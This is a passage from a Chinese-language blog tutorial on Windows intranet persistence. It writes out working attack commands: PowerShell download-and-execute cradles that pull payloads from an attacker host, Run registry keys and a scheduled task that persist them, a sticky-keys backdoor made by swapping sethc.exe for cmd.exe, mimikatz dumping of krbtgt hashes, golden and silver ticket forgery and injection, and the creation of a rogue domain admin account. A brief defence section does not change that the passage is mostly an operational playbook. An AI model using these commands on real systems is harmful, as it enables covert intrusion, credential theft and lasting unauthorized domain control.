+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">REG</span><span class="w"> </span><span class="n">ADD</span><span class="w"> </span><span class="err">“</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Run</span><span class="err">”</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">test1</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="err">“</span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">666</span><span class="p">.</span><span class="na">exe</span><span class="err">”</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/7.png"
+	width="1690"
+	height="838"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/7_hu_e88bfd3fe2b9d4f7.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/7_hu_9c68b8cb2344b9ca.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="484px"
+	
+></p>
+<h3 id="123cs-web投递攻击配合注册表写后门">1.2.3.CS Web投递攻击配合注册表写后门
+</h3><p><strong>CS先开启Web投递功能，然后在目标主机上执行对应的命令既可以一键实现无文件注册表后门</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/8.png"
+	width="2118"
+	height="767"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/8_hu_853734f734ed8433.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/8_hu_a563d57ba81c853d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="276"
+		data-flex-basis="662px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">nop</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="n">hidden</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.0.101:8081/logo&#39;))&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">REG</span><span class="w"> </span><span class="n">ADD</span><span class="w"> </span><span class="s">&#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">test1</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="s">&#34;\&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\&#34; -NoP -W Hidden -C \&#34;IEX((New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.66.128:8080/logo&#39;))\&#34;&#34;</span><span class="w"> </span><span class="o">/</span><span class="n">f</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/9.png"
+	width="1473"
+	height="588"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/9_hu_84ae5171f90438bd.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/9_hu_3005277af428ffa1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="601px"
+	
+></p>
+<h2 id="13计划任务后门">1.3.计划任务后门
+</h2><p><strong>这个计划任务写后门和注册表写后门怕对方有杀毒软件，由于会调用Powershell进行命令执行，杀毒软件都会发出警告</strong></p>
+<p><strong>这个也是可以配合CS的Web投递功能实现权限维持</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">nop</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="n">hidden</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.66.128:8080/logo&#39;))&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">后门脚本每一分钟执行一次</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">schtasks</span><span class="w"> </span><span class="o">/</span><span class="n">create</span><span class="w"> </span><span class="o">/</span><span class="n">sc</span><span class="w"> </span><span class="n">minute</span><span class="w"> </span><span class="o">/</span><span class="n">mo</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">/</span><span class="n">tn</span><span class="w"> </span><span class="s">&#34;shell&#34;</span><span class="w"> </span><span class="o">/</span><span class="n">tr</span><span class="w"> </span><span class="s">&#34;powershell.exe -nop -w hidden -c \&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.66.128:8080/logo&#39;))\&#34;&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="14粘滞键后门">1.4.粘滞键后门
+</h2><p><a class="link" href="https://blog.csdn.net/2303_78851087/article/details/145960331"  target="_blank" rel="noopener"
+    >Windows权限维持之shift后门(四)_权限维持shift后 命令-CSDN博客</a></p>
+<p><strong>适用于大多数Windows版本，连续按下5次shift就会弹出这个</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/10.png"
+	width="754"
+	height="297"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/10_hu_3891407b51cd545.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/10_hu_fff03590d8e88626.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="609px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">在此之前 我们要修改：C:\windows\system32\sethc.exe</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">move</span><span class="w"> </span><span class="n">sethc</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="n">sethc1</span><span class="p">.</span><span class="na">exe</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">copy</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="n">sethc</span><span class="p">.</span><span class="na">exe</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="15黄金票据白银票据">1.5.黄金票据&amp;白银票据
+</h2><p><strong>Kerberos认证流程：当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，验证通过后AS会发放的一个TGT，随后Client再次向TGS证明自己的身份，验证通过后TGS会发放一个ST，最后Client向Server发起认证请求，这个过程分为三块：</strong></p>
+<p><strong>Client与AS进行交互</strong></p>
+<p><strong>Client与TGS进行交互</strong></p>
+<p><strong>Client与Server进行交互</strong></p>
+<p><strong>黄金票据伪造的是TGT，白银票据伪造的是ST，黄金票据可以利用整个域内任何一个服务进行权限维持，白银票据只能利用某个服务进行权限维持</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/11.png"
+	width="1493"
+	height="707"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/11_hu_d1e2b9046c92d3a1.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/11_hu_17f7e488461e0361.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
+></p>
+<h3 id="151黄金票据">1.5.1.黄金票据
+</h3><h4 id="伪造黄金票据所需条件">伪造黄金票据所需条件
+</h4><p><strong><font style="color:#DF2A3F;">域名称，域SID值，域内KRBTGT账号的hash，伪造任意的用户名</font></strong></p>
+<p><strong>获取域SID值和域内KRBTGT账户的hash前提是拿到了域管理员的权限</strong></p>
+<h4 id="黄金票据的特点"><strong>黄金票据的特点</strong>
+</h4><p><strong>1.域控制器中的KDC服务不验证TGT中的用户帐户，直到TGT超过20分钟，这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</strong></p>
+<p><strong>2.由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据(TGT)只有10小时有效，如果票据声明有效期为10年，那么也会信任票据的有效性期为10年。</strong></p>
+<p><strong>3.该KRBTGT帐户密码丛不更改和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</strong></p>
+<h4 id="使用mimikatz生成黄金票据">使用mimikatz生成黄金票据
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">privilege</span><span class="p">::</span><span class="n">Debug</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lsadump</span><span class="p">::</span><span class="n">dcsync</span><span class="w"> </span><span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">vulntarget</span><span class="p">.</span><span class="na">com</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">krbtgt</span><span class="w">  </span><span class="c1">//只导出域内krbtgt用户的hash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mimikatz</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span><span class="w"> </span><span class="o">/</span><span class="n">patch</span><span class="w">        </span><span class="c1">//导出域内所有用户的hash，需要获取krbtgt用户的ntlm hash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Domain</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">WIN10</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="n">1</span><span class="o">-</span><span class="n">5</span><span class="o">-</span><span class="n">21</span><span class="o">-</span><span class="n">904365891</span><span class="o">-</span><span class="n">2126640510</span><span class="o">-</span><span class="n">4108959213</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">dsquery</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="n">krbtgt</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/12.png"
+	width="1193"
+	height="502"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/12_hu_7ce151ae592f2ee9.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/12_hu_1f6c2f4dfe20a5ac.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="570px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">krbtgt</span><span class="w"> </span><span class="n">hash</span><span class="p">:</span><span class="n">66bac16b441a532d65a71b7bcc4b2bf5</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">S</span><span class="o">-</span><span class="n">1</span><span class="o">-</span><span class="n">5</span><span class="o">-</span><span class="n">21</span><span class="o">-</span><span class="n">904365891</span><span class="o">-</span><span class="n">2126640510</span><span class="o">-</span><span class="n">4108959213</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">生成黄金票据</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kerberos</span><span class="p">::</span><span class="n">golden</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span><span class="w"> </span><span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">vulntarget</span><span class="p">.</span><span class="na">com</span><span class="w"> </span><span class="o">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="o">-</span><span class="n">1</span><span class="o">-</span><span class="n">5</span><span class="o">-</span><span class="n">21</span><span class="o">-</span><span class="n">904365891</span><span class="o">-</span><span class="n">2126640510</span><span class="o">-</span><span class="n">4108959213</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">66bac16b441a532d65a71b7bcc4b2bf5</span><span class="w"> </span><span class="o">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">ticket</span><span class="p">.</span><span class="na">kirbi</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kerberos</span><span class="p">::</span><span class="n">ptt</span><span class="w"> </span><span class="n">ticket</span><span class="p">.</span><span class="na">kirbi</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kerberos</span><span class="p">::</span><span class="n">tgt</span><span class="w">     </span><span class="c1">//查看生成的tgt票据</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kerberos</span><span class="p">::</span><span class="n">purge</span><span class="w">   </span><span class="c1">//清除票据</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/13.png"
+	width="1989"
+	height="768"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/13_hu_12787a1bd1be7001.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/13_hu_bb0bcbcd673983db.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="258"
+		data-flex-basis="621px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">win101</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">mimikatz</span><span class="err">\</span><span class="n">ticket</span><span class="p">.</span><span class="na">kirbi</span><span class="w">  </span><span class="c1">//注入票据</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">*</span><span class="w"> </span><span class="n">File</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">win101</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">mimikatz</span><span class="err">\</span><span class="n">ticket</span><span class="p">.</span><span class="na">kirbi</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">OK</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>新开一个窗口：执行dir \dc\c$ 看是否能够正常看到</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/14.png"
+	width="1478"
+	height="460"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/14_hu_df7b8c02439340e3.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/14_hu_bc7aff498cb6360d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="321"
+		data-flex-basis="771px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">net</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">hack</span><span class="w"> </span><span class="n">Admin123</span><span class="w"> </span><span class="o">/</span><span class="n">add</span><span class="w"> </span><span class="o">/</span><span class="n">domain</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">net</span><span class="w"> </span><span class="n">group</span><span class="w"> </span><span class="s">&#34;domain admins&#34;</span><span class="w"> </span><span class="n">hack</span><span class="w"> </span><span class="o">/</span><span class="n">add</span><span class="w"> </span><span class="o">/</span><span class="n">domain</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="黄金票据防御">黄金票据防御
+</h4><p><strong>1.限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组.这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库(ntds.dit文件)，则无法获取到KRBTGT帐户密码。</strong></p>
+<p><strong>2.禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在KerberOs票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</strong></p>
+<h3 id="152白银票据"><strong>1.5.2.白银票据</strong>
+</h3><p><strong>Silver Tickets(下面称银票)就是伪造的ST(Service Ticket),因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值)，所以银票只能访问指定服务。</strong></p>
+<h4 id="伪造白银票据所需条件"><strong>伪造白银票据所需条件</strong>
+</h4><p><strong><font style="color:#DF2A3F;">域名，域sid，目标服务器名，可利用的服务，服务账号的NTML HASH，需要伪造的用户名</font></strong></p>
+<h4 id="白银票据服务列表"><strong>白银票据服务列表</strong>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WMI</span><span class="w">                   </span><span class="n">HOST</span><span class="err">、</span><span class="n">RPCSS</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PowerShell</span><span class="w"> </span><span class="n">Remoting</span><span class="w">   </span><span class="n">HOST</span><span class="err">、</span><span class="n">HTTP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">WinRM</span><span class="w">                 </span><span class="n">HOST</span><span class="err">、</span><span class="n">HTTP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Scheduled</span><span class="w"> </span><span class="n">Tasks</span><span class="w">       </span><span class="n">HOST</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">WindowsFileShare</span><span class="w">      </span><span class="n">CIFS</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">LDAP</span><span class="w">                  </span><span class="n">LDAP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">WindowsRemoteServer</span><span class="w">   </span><span class="n">RPCSS</span><span class="err">、</span><span class="n">LDAP</span><span class="err">、</span><span class="n">CIFS</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="使用mimikatz生成白银票据">使用mimikatz生成白银票据
+</h4><p><a class="link" href="https://cloud.tencent.com/developer/article/2447269"  target="_blank" rel="noopener"
+    >内网渗透 | 多种票据攻击详解-腾讯云开发者社区-腾讯云</a></p>
+<p><a class="link" href="https://blog.csdn.net/2401_88083440/article/details/146463290"  target="_blank" rel="noopener"
+    >域渗透学习——伪造黄金、白银票据攻击-CSDN博客</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">利用CIFS权限进行伪造</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">sekurlsa</span><span class="p">::</span><span class="n">logonPasswords</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kerberos</span><span class="p">::</span><span class="n">golden</span><span class="w"> </span><span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">god</span><span class="p">.</span><span class="na">org</span><span class="w"> </span><span class="o">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="o">-</span><span class="n">1</span><span class="o">-</span><span class="n">5</span><span class="o">-</span><span class="n">21</span><span class="o">-</span><span class="n">2952760202</span><span class="o">-</span><span class="n">1353902439</span><span class="o">-</span><span class="n">2381784089</span><span class="w"> </span><span class="o">/</span><span class="n">target</span><span class="p">:</span><span class="n">administrator</span><span class="p">.</span><span class="na">god</span><span class="p">.</span><span class="na">org</span><span class="w"> </span><span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">152df0bd8dc97d27d9b8b934bc30b56d</span><span class="w"> </span><span class="o">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">hacker</span><span class="w"> </span><span class="o">/</span><span class="n">ptt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kerberos</span><span class="p">::</span><span class="n">golden</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span><span class="w"> </span><span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">vulntarget</span><span class="p">.</span><span class="na">com</span><span class="w"> </span><span class="o">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="o">-</span><span class="n">1</span><span class="o">-</span><span class="n">5</span><span class="o">-</span><span class="n">21</span><span class="o">-</span><span class="n">904365891</span><span class="o">-</span><span class="n">2126640510</span><span class="o">-</span><span class="n">4108959213</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">target</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="na">vulntarget</span><span class="p">.</span><span class="na">com</span><span class="w"> </span><span class="o">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span><span class="w"> </span><span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">ntlmhash</span><span class="w"> </span><span class="o">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">ticket</span><span class="p">.</span><span class="na">kirbi</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/15.png"
+	width="1408"
+	height="374"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/15_hu_7f5080cc39b174b3.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/15_hu_c55386d500da5b1c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="376"
+		data-flex-basis="903px"
+	
+></p>
+<h2 id="16映像劫持">1.6.映像劫持
+</h2><p><font style="color:rgb(77, 77, 77);">“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。</font></p>
+<p><font style="color:rgb(77, 77, 77);">演示：<br>
+</font><font style="color:rgb(77, 77, 77);">注册表位置：</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
